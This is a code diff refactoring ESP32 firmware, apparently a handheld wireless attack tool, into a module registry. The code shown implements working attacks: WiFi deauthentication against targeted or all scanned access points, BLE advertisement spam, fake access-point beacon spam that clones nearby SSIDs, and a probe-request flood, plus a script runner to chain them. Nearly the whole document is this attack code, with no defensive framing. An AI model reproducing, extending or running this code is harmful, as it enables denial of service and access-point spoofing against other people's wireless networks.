@@ -2,6 +2,8 @@
 
 #include "ble_spam.h"
 #include "fakeap.h"
+#include "velobox_config.h"
+
 #include "freertos/FreeRTOS.h"
 #include "freertos/task.h"
 #include "esp_log.h"
@@ -34,77 +36,98 @@ static uint8_t s_target_client[6] = {0};
 /* counters (reset when an action starts) */
 static action_counters_t s_counters = {0};
 
+/* reusable buffer so the action task doesn't blow the 4K stack */
+static char s_fakeap_ssids[64][33];
+static uint32_t s_fakeap_ssid_count = 0;
+
+/* ------------------------------------------------------------------ */
+/*  Module registry (generated from module_list.h -- edit that file)  */
+/* ------------------------------------------------------------------ */
+
+/* Declare every run_* named in module_list.h, so adding a row there is
+   enough -- you only have to define the function further down. */
+#define VELO_MODULE_PROTO(id, slug_, label_, hint_, group_, danger_, flag_, run_) \
+    static void run_(volatile bool *kill);
+VELO_MODULE_LIST(VELO_MODULE_PROTO)
+#undef VELO_MODULE_PROTO
+
+#define VELO_MODULE_ROW(id, slug_, label_, hint_, group_, danger_, flag_, run_) \
+    {id, slug_, label_, hint_, group_, danger_, flag_, run_},
+static const velo_module_t k_modules[] = {
+    VELO_MODULE_LIST(VELO_MODULE_ROW)
+};
+#undef VELO_MODULE_ROW
+
+#define MODULE_COUNT (sizeof(k_modules) / sizeof(k_modules[0]))
+
 void actions_set_settings(velo_settings_t *s) { s_settings = s; }
 
-const char *actions_name(action_t a) {
-    switch (a) {
-    case ACTION_WIFI_DEAUTH:
-        return "WiFi Deauth";
-    case ACTION_BLE_SPAM:
-        return "BLE Spam";
-    case ACTION_FAKE_AP:
-        return "Fake AP";
-    case ACTION_RECON:
-        return "WiFi Scan";
-    case ACTION_BLE_SCAN:
-        return "BLE Scan";
-    case ACTION_PROBE_FLOOD:
-        return "Probe Flood";
-    default:
-        return "None";
+const velo_module_t *actions_modules(size_t *count) {
+    if (count) {
+        *count = MODULE_COUNT;
     }
+    return k_modules;
 }
 
-bool actions_is_running(void) {
-    return g_action_task != NULL || g_script_task != NULL;
+const velo_module_t *actions_module_at(size_t i) {
+    return i < MODULE_COUNT ? &k_modules[i] : NULL;
 }
-action_t actions_current(void) { return g_current_action; }
-bool actions_script_running(void) { return g_script_task != NULL; }
 
-bool actions_script_snapshot(script_t *out, uint32_t *index) {
-    if (g_script_task == NULL) {
+const velo_module_t *actions_module_for(action_t a) {
+    for (size_t i = 0; i < MODULE_COUNT; i++) {
+        if (k_modules[i].action == a) {
+            return &k_modules[i];
+        }
+    }
+    return NULL;
+}
+
+const velo_module_t *actions_module_by_slug(const char *slug) {
+    if (!slug) {
+        return NULL;
+    }
+    for (size_t i = 0; i < MODULE_COUNT; i++) {
+        if (strcmp(k_modules[i].slug, slug) == 0) {
+            return &k_modules[i];
+        }
+    }
+    return NULL;
+}
+
+const char *actions_slug(action_t a) {
+    if (a == ACTION_NONE) {
+        return "none";
+    }
+    const velo_module_t *m = actions_module_for(a);
+    return m ? m->slug : "";
+}
+
+bool actions_module_enabled(const velo_module_t *m) {
+    if (!m || !m->flag) {
         return false;
     }
-    if (out) {
-        *out = s_script;
-    }
-    if (index) {
-        *index = s_script_index;
+    /* runtime gates: a module can be switched off from Settings even when
+       it is compiled in. (Only BLE spam has one today.) */
+    if (m->action == ACTION_BLE_SPAM && s_settings &&
+        !s_settings->ble_spam_enabled) {
+        return false;
     }
     return true;
 }
 
-void actions_set_target(const uint8_t ap_bssid[6], const uint8_t client[6]) {
-    if (ap_bssid) {
-        memcpy(s_target_ap, ap_bssid, 6);
-    }
-    if (client) {
-        memcpy(s_target_client, client, 6);
-    } else {
-        memset(s_target_client, 0, 6);
-    }
-}
-
-void actions_clear_target(void) {
-    memset(s_target_ap, 0, 6);
-    memset(s_target_client, 0, 6);
-}
-
-action_counters_t actions_counters(void) { return s_counters; }
-
-/* reusable buffers so the action task doesn't blow the 4K stack */
-static char s_fakeap_ssids[64][33];
-static uint32_t s_fakeap_ssid_count = 0;
-
-/* important: g_kill_action reset per start */
-static bool mac_zero(const uint8_t m[6]) {
-    return m[0] == 0 && m[1] == 0 && m[2] == 0 && m[3] == 0 && m[4] == 0 &&
-           m[5] == 0;
+const char *actions_name(action_t a) {
+    const velo_module_t *m = actions_module_for(a);
+    return m ? m->label : "None";
 }
 
 /* ------------------------------------------------------------------ */
 /*  Frame builders                                                    */
 /* ------------------------------------------------------------------ */
+
+static bool mac_zero(const uint8_t m[6]) {
+    return m[0] == 0 && m[1] == 0 && m[2] == 0 && m[3] == 0 && m[4] == 0 &&
+           m[5] == 0;
+}
 
 static int build_deauth_frame(uint8_t *out, const uint8_t bssid[6],
                               const uint8_t dest[6]) {
@@ -174,10 +197,6 @@ static void tx_probe(const char *ssid, uint8_t ssid_len, uint8_t channel) {
     s_counters.probe_sent++;
 }
 
-/* ------------------------------------------------------------------ */
-/*  Channel utils                                                     */
-/* ------------------------------------------------------------------ */
-
 static uint8_t find_ap_channel(const uint8_t bssid[6]) {
     recon_ap_t ap;
     if (recon_get_ap(bssid, &ap)) {
@@ -186,205 +205,189 @@ static uint8_t find_ap_channel(const uint8_t bssid[6]) {
     return 1;
 }
 
+/* Load custom + cloned SSIDs into s_fakeap_ssids and return the count. */
+static uint32_t collect_ssids(void) {
+    uint32_t n = 0;
+    if (s_settings) {
+        uint32_t c = settings_ssid_count(s_settings);
+        if (c > 64) c = 64;
+        for (uint32_t i = 0; i < c; i++) {
+            settings_get_ssid(s_settings, i, s_fakeap_ssids[n], 33);
+            n++;
+        }
+    }
+    recon_lock();
+    uint32_t room = 64 - n > 32 ? 32 : 64 - n;
+    uint32_t clones = recon_core_ssids(&s_fakeap_ssids[n], room);
+    recon_unlock();
+    return n + clones;
+}
+
 /* ------------------------------------------------------------------ */
-/*  Action task                                                       */
+/*  Module bodies. Each runs in its own 4K task until *kill is true.   */
+/* ------------------------------------------------------------------ */
+
+/* ---- WiFi Deauth ---- */
+static void run_deauth(volatile bool *kill) {
+    ESP_LOGI(TAG, "WiFi deauth starting");
+    if (!recon_start()) {
+        ESP_LOGE(TAG, "promiscuous failed, aborting deauth");
+        return;
+    }
+
+    while (!*kill) {
+        /* targeted deauth */
+        if (!mac_zero(s_target_ap)) {
+            uint8_t ch = find_ap_channel(s_target_ap);
+            ap_set_channel(ch);
+            if (!mac_zero(s_target_client)) {
+                tx_deauth(s_target_ap, s_target_client);
+            } else {
+                tx_deauth(s_target_ap,
+                          (const uint8_t[6]){0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF});
+            }
+            vTaskDelay(pdMS_TO_TICKS(20));
+            continue;
+        }
+
+        /* broadcast deauth on all scanned APs */
+        uint8_t bssids[32][6];
+        recon_lock();
+        uint32_t n = recon_core_aps(bssids, 32);
+        recon_unlock();
+
+        for (uint32_t i = 0; i < n && !*kill; i++) {
+            ap_set_channel(find_ap_channel(bssids[i]));
+            tx_deauth(bssids[i],
+                      (const uint8_t[6]){0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF});
+            vTaskDelay(pdMS_TO_TICKS(8));
+        }
+
+        if (n == 0) {
+            /* no scan data, hop and shout */
+            for (uint8_t ch = 1; ch <= 13 && !*kill; ch++) {
+                ap_set_channel(ch);
+                uint8_t rand_bssid[6];
+                esp_fill_random(rand_bssid, 6);
+                rand_bssid[0] = (rand_bssid[0] & 0xFE) | 0x02;
+                tx_deauth(rand_bssid,
+                          (const uint8_t[6]){0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF});
+                vTaskDelay(pdMS_TO_TICKS(20));
+            }
+        }
+    }
+
+    recon_stop();
+}
+
+/* ---- BLE Spam ---- */
+static void run_ble_spam(volatile bool *kill) {
+    ESP_LOGI(TAG, "BLE kitchen-sink spam running");
+    while (!*kill) {
+        ble_spam_kitchen_sink_run_once();
+        vTaskDelay(pdMS_TO_TICKS(150));
+    }
+    ble_spam_stop();
+    ESP_LOGI(TAG, "Stopping BLE spam sequence...");
+}
+
+/* ---- Fake AP (beacon spam) ---- */
+static void run_fakeap(volatile bool *kill) {
+    ESP_LOGI(TAG, "Fake AP starting");
+    s_counters.beacon_sent = 0;
+
+    ap_config_t config = {
+        .SSID = {0},
+        .PASSWORD = {0},
+        .WIFI_CHANNEL = AP_DEFAULT_CHANNEL,
+        .MAX_CONNECTIONS = AP_DEFAULT_MAX_CONNECTIONS,
+    };
+    if (s_settings) {
+        config.WIFI_CHANNEL = s_settings->fakeap_channel;
+        config.MAX_CONNECTIONS = s_settings->fakeap_max_connections;
+    }
+    create_config(&config);
+    ap_set_channel(config.WIFI_CHANNEL);
+
+    s_fakeap_ssid_count = collect_ssids();
+
+    while (!*kill) {
+        for (uint32_t i = 0; i < s_fakeap_ssid_count && !*kill; i++) {
+            ap_run(config, s_fakeap_ssids[i]);
+            s_counters.beacon_sent++;
+            vTaskDelay(pdMS_TO_TICKS(10));
+        }
+    }
+
+    ESP_LOGI(TAG, "Stopping Fake AP sequence...");
+    esp_wifi_stop();
+    ap_ensure_start();
+}
+
+/* ---- WiFi Scan (recon) ---- */
+static void run_recon(volatile bool *kill) {
+    ESP_LOGI(TAG, "WiFi recon starting");
+    recon_reset();
+    if (!recon_start()) {
+        ESP_LOGE(TAG, "promiscuous failed, aborting scan");
+        return;
+    }
+    while (!*kill) {
+        recon_hop_once();
+    }
+    recon_stop();
+    ESP_LOGI(TAG, "WiFi scan stopped");
+}
+
+/* ---- BLE Scan ---- */
+static void run_blescan(volatile bool *kill) {
+    ESP_LOGI(TAG, "BLE scan starting");
+    ble_scan_start();
+    while (!*kill) {
+        vTaskDelay(pdMS_TO_TICKS(200));
+    }
+    ble_scan_stop();
+    ESP_LOGI(TAG, "BLE scan stopped");
+}
+
+/* ---- Probe request flood ---- */
+static void run_probe(volatile bool *kill) {
+    ESP_LOGI(TAG, "probe flood starting");
+    if (!recon_start()) {
+        ESP_LOGE(TAG, "promiscuous failed, aborting probe flood");
+        return;
+    }
+
+    s_fakeap_ssid_count = collect_ssids();
+
+    while (!*kill) {
+        for (uint8_t ch = 1; ch <= 13 && !*kill; ch++) {
+            ap_set_channel(ch);
+            for (uint32_t i = 0; i < s_fakeap_ssid_count && !*kill; i++) {
+                uint8_t n = (uint8_t)strlen(s_fakeap_ssids[i]);
+                if (n > 32) n = 32;
+                tx_probe(s_fakeap_ssids[i], n, ch);
+                vTaskDelay(pdMS_TO_TICKS(15));
+            }
+            if (s_fakeap_ssid_count == 0) {
+                tx_probe("", 0, ch);
+                vTaskDelay(pdMS_TO_TICKS(15));
+            }
+        }
+    }
+
+    recon_stop();
+}
+
+/* ------------------------------------------------------------------ */
+/*  Action task / lifecycle                                           */
 /* ------------------------------------------------------------------ */
 
 static void action_task_wrapper(void *pvParameters) {
-    action_t action = (action_t)(intptr_t)pvParameters;
+    const velo_module_t *m = (const velo_module_t *)pvParameters;
     memset(&s_counters, 0, sizeof(s_counters));
 
-    switch (action) {
-
-    /* ---- WiFi Deauth ---- */
-    case ACTION_WIFI_DEAUTH: {
-        ESP_LOGI(TAG, "WiFi deauth starting");
-        if (!recon_start()) {
-            ESP_LOGE(TAG, "promiscuous failed, aborting deauth");
-            break;
-        }
-
-        while (!g_kill_action) {
-            /* targeted deauth */
-            if (!mac_zero(s_target_ap)) {
-                uint8_t ch = find_ap_channel(s_target_ap);
-                ap_set_channel(ch);
-                if (!mac_zero(s_target_client)) {
-                    tx_deauth(s_target_ap, s_target_client);
-                } else {
-                    tx_deauth(s_target_ap, (const uint8_t[6]){0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF});
-                }
-                vTaskDelay(pdMS_TO_TICKS(20));
-                continue;
-            }
-
-            /* broadcast deauth on all scanned APs */
-            uint8_t bssids[32][6];
-            recon_lock();
-            uint32_t n = recon_core_aps(bssids, 32);
-            recon_unlock();
-
-            for (uint32_t i = 0; i < n && !g_kill_action; i++) {
-                ap_set_channel(find_ap_channel(bssids[i]));
-                tx_deauth(bssids[i], (const uint8_t[6]){0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF});
-                vTaskDelay(pdMS_TO_TICKS(8));
-            }
-
-            if (n == 0) {
-                /* no scan data, hop and shout */
-                for (uint8_t ch = 1; ch <= 13 && !g_kill_action; ch++) {
-                    ap_set_channel(ch);
-                    uint8_t rand_bssid[6];
-                    esp_fill_random(rand_bssid, 6);
-                    rand_bssid[0] = (rand_bssid[0] & 0xFE) | 0x02;
-                    tx_deauth(rand_bssid, (const uint8_t[6]){0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF});
-                    vTaskDelay(pdMS_TO_TICKS(20));
-                }
-            }
-        }
-
-        recon_stop();
-        break;
-    }
-
-    /* ---- BLE Spam ---- */
-    case ACTION_BLE_SPAM:
-        ESP_LOGI(TAG, "BLE kitchen-sink spam running");
-        while (!g_kill_action) {
-            ble_spam_kitchen_sink_run_once();
-            vTaskDelay(pdMS_TO_TICKS(150));
-        }
-        ble_spam_stop();
-        ESP_LOGI(TAG, "Stopping BLE spam sequence...");
-        break;
-
-    /* ---- Fake AP (beacon spam) ---- */
-    case ACTION_FAKE_AP: {
-        ESP_LOGI(TAG, "Fake AP starting");
-        s_counters.beacon_sent = 0;
-
-        ap_config_t config = {
-            .SSID = {0},
-            .PASSWORD = {0},
-            .WIFI_CHANNEL = AP_DEFAULT_CHANNEL,
-            .MAX_CONNECTIONS = AP_DEFAULT_MAX_CONNECTIONS,
-        };
-        if (s_settings) {
-            config.WIFI_CHANNEL = s_settings->fakeap_channel;
-            config.MAX_CONNECTIONS = s_settings->fakeap_max_connections;
-        }
-        create_config(&config);
-        ap_set_channel(config.WIFI_CHANNEL);
-
-        s_fakeap_ssid_count = 0;
-
-        /* custom SSIDs from settings */
-        if (s_settings) {
-            uint32_t n = settings_ssid_count(s_settings);
-            if (n > 64) n = 64;
-            for (uint32_t i = 0; i < n; i++) {
-                settings_get_ssid(s_settings, i, s_fakeap_ssids[s_fakeap_ssid_count], 33);
-                s_fakeap_ssid_count++;
-            }
-        }
-
-        /* cloned APs from the scan table */
-        recon_lock();
-        uint32_t clone_n = recon_core_ssids(
-            &s_fakeap_ssids[s_fakeap_ssid_count],
-            64 - s_fakeap_ssid_count > 32 ? 32 : 64 - s_fakeap_ssid_count);
-        recon_unlock();
-        s_fakeap_ssid_count += clone_n;
-
-        while (!g_kill_action) {
-            for (uint32_t i = 0; i < s_fakeap_ssid_count && !g_kill_action; i++) {
-                ap_run(config, s_fakeap_ssids[i]);
-                s_counters.beacon_sent++;
-                vTaskDelay(pdMS_TO_TICKS(10));
-            }
-        }
-
-        ESP_LOGI(TAG, "Stopping Fake AP sequence...");
-        esp_wifi_stop();
-        ap_ensure_start();
-        break;
-    }
-
-    /* ---- WiFi Scan (recon) ---- */
-    case ACTION_RECON:
-        ESP_LOGI(TAG, "WiFi recon starting");
-        recon_reset();
-        if (!recon_start()) {
-            ESP_LOGE(TAG, "promiscuous failed, aborting scan");
-            break;
-        }
-        while (!g_kill_action) {
-            recon_hop_once();
-        }
-        recon_stop();
-        ESP_LOGI(TAG, "WiFi scan stopped");
-        break;
-
-    /* ---- BLE Scan ---- */
-    case ACTION_BLE_SCAN:
-        ESP_LOGI(TAG, "BLE scan starting");
-        ble_scan_start();
-        while (!g_kill_action) {
-            vTaskDelay(pdMS_TO_TICKS(200));
-        }
-        ble_scan_stop();
-        ESP_LOGI(TAG, "BLE scan stopped");
-        break;
-
-    /* ---- Probe request flood ---- */
-    case ACTION_PROBE_FLOOD: {
-        ESP_LOGI(TAG, "probe flood starting");
-        if (!recon_start()) {
-            ESP_LOGE(TAG, "promiscuous failed, aborting probe flood");
-            break;
-        }
-
-        s_fakeap_ssid_count = 0;
-        if (s_settings) {
-            uint32_t n = settings_ssid_count(s_settings);
-            if (n > 64) n = 64;
-            for (uint32_t i = 0; i < n; i++) {
-                settings_get_ssid(s_settings, i,
-                                  s_fakeap_ssids[s_fakeap_ssid_count], 33);
-                s_fakeap_ssid_count++;
-            }
-        }
-        recon_lock();
-        uint32_t cn = recon_core_ssids(
-            &s_fakeap_ssids[s_fakeap_ssid_count],
-            64 - s_fakeap_ssid_count > 32 ? 32 : 64 - s_fakeap_ssid_count);
-        recon_unlock();
-        s_fakeap_ssid_count += cn;
-
-        while (!g_kill_action) {
-            for (uint8_t ch = 1; ch <= 13 && !g_kill_action; ch++) {
-                ap_set_channel(ch);
-                for (uint32_t i = 0; i < s_fakeap_ssid_count && !g_kill_action;
-                     i++) {
-                    uint8_t n = (uint8_t)strlen(s_fakeap_ssids[i]);
-                    if (n > 32) n = 32;
-                    tx_probe(s_fakeap_ssids[i], n, ch);
-                    vTaskDelay(pdMS_TO_TICKS(15));
-                }
-                if (s_fakeap_ssid_count == 0) {
-                    tx_probe("", 0, ch);
-                    vTaskDelay(pdMS_TO_TICKS(15));
-                }
-            }
-        }
-
-        recon_stop();
-        break;
-    }
-
-    default:
-        break;
-    }
+    m->run(&g_kill_action);
 
     g_action_task = NULL;
     g_current_action = ACTION_NONE;
@@ -395,16 +398,17 @@ static bool action_spawn(action_t action) {
     if (action <= ACTION_NONE || action >= ACTION_COUNT) {
         return false;
     }
-    if (action == ACTION_BLE_SPAM && s_settings && !s_settings->ble_spam_enabled) {
-        ESP_LOGW(TAG, "BLE spam disabled in settings");
+    const velo_module_t *m = actions_module_for(action);
+    if (!m || !actions_module_enabled(m)) {
+        ESP_LOGW(TAG, "module unavailable/disabled: %s", actions_slug(action));
         return false;
     }
 
     g_kill_action = false;
     g_current_action = action;
     BaseType_t ok =
-        xTaskCreate(action_task_wrapper, "action", 4096,
-                    (void *)(intptr_t)action, 5, &g_action_task);
+        xTaskCreate(action_task_wrapper, "action", 4096, (void *)m, 5,
+                    &g_action_task);
     if (ok != pdPASS) {
         g_action_task = NULL;
         g_current_action = ACTION_NONE;
@@ -413,6 +417,43 @@ static bool action_spawn(action_t action) {
     ESP_LOGI(TAG, "started: %s", actions_name(action));
     return true;
 }
+
+bool actions_is_running(void) {
+    return g_action_task != NULL || g_script_task != NULL;
+}
+action_t actions_current(void) { return g_current_action; }
+bool actions_script_running(void) { return g_script_task != NULL; }
+
+bool actions_script_snapshot(script_t *out, uint32_t *index) {
+    if (g_script_task == NULL) {
+        return false;
+    }
+    if (out) {
+        *out = s_script;
+    }
+    if (index) {
+        *index = s_script_index;
+    }
+    return true;
+}
+
+void actions_set_target(const uint8_t ap_bssid[6], const uint8_t client[6]) {
+    if (ap_bssid) {
+        memcpy(s_target_ap, ap_bssid, 6);
+    }
+    if (client) {
+        memcpy(s_target_client, client, 6);
+    } else {
+        memset(s_target_client, 0, 6);
+    }
+}
+
+void actions_clear_target(void) {
+    memset(s_target_ap, 0, 6);
+    memset(s_target_client, 0, 6);
+}
+
+action_counters_t actions_counters(void) { return s_counters; }
 
 bool actions_start(action_t action) {
     if (actions_is_running()) {
@@ -455,8 +496,13 @@ void actions_stop(void) {
 /*  Script runner                                                     */
 /* ------------------------------------------------------------------ */
 
-static action_t script_cmd_action(script_cmd_t c) {
-    switch (c) {
+static action_t script_cmd_action(const script_step_t *st) {
+    if (st->cmd == SCRIPT_CMD_ACTION) {
+        /* any registered module, by slug */
+        const velo_module_t *m = actions_module_by_slug(st->slug);
+        return m ? m->action : ACTION_NONE;
+    }
+    switch (st->cmd) {
     case SCRIPT_CMD_DEAUTH:
         return ACTION_WIFI_DEAUTH;
     case SCRIPT_CMD_RECON:
@@ -498,11 +544,11 @@ static void script_task_wrapper(void *pvParameters) {
             continue;
         }
 
-        action_t a = script_cmd_action(st->cmd);
+        action_t a = script_cmd_action(st);
         if (a == ACTION_NONE) {
             continue;
         }
-        if (st->cmd == SCRIPT_CMD_DEAUTH) {
+        if (a == ACTION_WIFI_DEAUTH) {
             actions_clear_target();
             if (st->has_ap) {
                 actions_set_target(st->ap, st->has_client ? st->client : NULL);
